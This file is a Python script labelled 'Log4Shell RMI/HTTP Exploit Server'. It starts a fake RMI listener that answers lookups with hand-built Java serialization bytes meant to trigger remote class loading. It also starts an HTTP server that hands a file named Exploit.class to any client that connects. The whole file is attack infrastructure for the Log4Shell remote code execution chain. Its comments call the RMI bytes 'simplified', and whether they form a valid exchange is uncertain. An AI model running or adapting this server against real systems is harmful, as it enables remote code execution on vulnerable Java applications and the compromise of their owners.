#!/usr/bin/env python3
import socket
import threading
import struct
import time
from http.server import HTTPServer, SimpleHTTPRequestHandler

class RMIServer:
    def __init__(self, rmi_port=1099, http_port=8888):
        self.rmi_port = rmi_port
        self.http_port = http_port

    def handle_rmi_connection(self, conn, addr):
        """Handle RMI connections and redirect to HTTP server"""
        print(f"[RMI] Connection from {addr[0]}:{addr[1]}")

        try:
            # Read initial RMI handshake
            data = conn.recv(1024)
            print(f"[RMI] Received {len(data)} bytes")

            # Send RMI response pointing to our HTTP server
            # This is a simplified RMI response that tells Java to load our class

            # RMI protocol response
            response = b'JRMI\x00\x02\x4b'  # RMI header
            response += b'\x00\x00\x00\x00\x00\x00'  # Protocol ACK

            conn.send(response)

            # Wait for lookup request
            data = conn.recv(1024)

            # Send reference to our HTTP server
            # This is a simplified response that triggers class loading
            http_url = f"http://localhost:{self.http_port}/"

            # Build RMI return with codebase
            rmi_return = bytearray()
            rmi_return.extend(b'\x51\xac\xed\x00\x05')  # Java serialization header
            rmi_return.extend(b'\x77\x0f')  # Block data mode
            rmi_return.extend(b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
            rmi_return.extend(b'\x73\x72')  # TC_OBJECT + TC_CLASSDESC

            # Class descriptor for java.rmi.MarshalledObject
            rmi_return.extend(b'\x00\x1b')  # Length
            rmi_return.extend(b'java.rmi.MarshalledObject')

            # Add codebase annotation
            rmi_return.extend(b'\x7c\xbd\x1e\x97\xad\x6f\xb5\x9e')  # serialVersionUID
            rmi_return.extend(b'\x03\x00\x01')  # Flags
            rmi_return.extend(b'[\x00\x08objBytes')
            rmi_return.extend(b't\x00\x02[B')
            rmi_return.extend(b'L\x00\x06locLoct\x00\x02')

            conn.send(bytes(rmi_return))
            print("[RMI] Sent RMI response")

        except Exception as e:
            print(f"[RMI] Error: {e}")
        finally:
            conn.close()

    def start_rmi_server(self):
        """Start RMI server"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', self.rmi_port))
        sock.listen(5)
        print(f"[+] RMI server listening on 0.0.0.0:{self.rmi_port}")

        while True:
            conn, addr = sock.accept()
            thread = threading.Thread(target=self.handle_rmi_connection, args=(conn, addr))
            thread.daemon = True
            thread.start()

    def start_http_server(self):
        """Start HTTP server to serve the exploit class"""
        class ExploitHandler(SimpleHTTPRequestHandler):
            def do_GET(self):
                print(f"[HTTP] Request from {self.client_address[0]}: {self.path}")

                if 'Exploit' in self.path or self.path == '/':
                    try:
                        with open('Exploit.class', 'rb') as f:
                            content = f.read()

                        self.send_response(200)
                        self.send_header('Content-Type', 'application/java-vm')
                        self.send_header('Content-Length', str(len(content)))
                        self.end_headers()
                        self.wfile.write(content)
                        print(f"[+] Served Exploit.class ({len(content)} bytes)")
                        print("[!!!] Exploit delivered - check for calc.exe!")
                    except FileNotFoundError:
                        print("[!] Exploit.class not found")
                        self.send_error(404)
                else:
                    self.send_error(404)

            def log_message(self, format, *args):
                pass

        server = HTTPServer(('0.0.0.0', self.http_port), ExploitHandler)
        print(f"[+] HTTP server listening on 0.0.0.0:{self.http_port}")
        server.serve_forever()

    def run(self):
        print("=" * 60)
        print("Log4Shell RMI/HTTP Exploit Server")
        print("=" * 60)

        # Start RMI server in background
        rmi_thread = threading.Thread(target=self.start_rmi_server)
        rmi_thread.daemon = True
        rmi_thread.start()

        # Run HTTP server in main thread
        try:
            self.start_http_server()
        except KeyboardInterrupt:
            print("\n[*] Shutting down...")

if __name__ == "__main__":
    server = RMIServer()
    server.run()